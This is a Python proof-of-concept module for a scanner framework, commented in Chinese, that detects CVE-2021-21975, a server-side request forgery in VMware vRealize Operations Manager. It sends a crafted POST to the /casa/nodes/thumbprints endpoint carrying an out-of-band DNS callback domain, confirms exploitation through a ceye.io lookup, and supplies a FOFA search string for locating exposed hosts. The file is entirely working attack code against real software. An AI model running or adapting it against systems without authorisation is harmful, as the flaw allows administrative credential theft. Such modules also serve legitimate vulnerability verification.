# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "VMware vRealize Operations Manager SSRF漏洞 CVE-2021-21975",                        # 漏洞名称
        "VulnID" : "CVE-2021-21975",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "VMware vRealize Operations Manager",                     # 漏洞应用名称
        "AppVersion" : """
            VMware:vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0
            VMware:cloud_foundation: 4.x 3.x
            VMware:vRealize_suite_lifecycle_manager: 8.x
        """,                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            vRealize Operations Manager API包含服务器端请求伪造。
            可以通过网络访问vRealize Operations Manager API的恶意攻击者可以执行服务器端请求伪造攻击(SSRF)，以窃取管理凭据。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            title="vRealize Operations Manager"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/casa/nodes/thumbprints" # url自己按需调整
        
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]

        data = """["%s"]""" % (dns_flag)

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json;charset=UTF-8",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()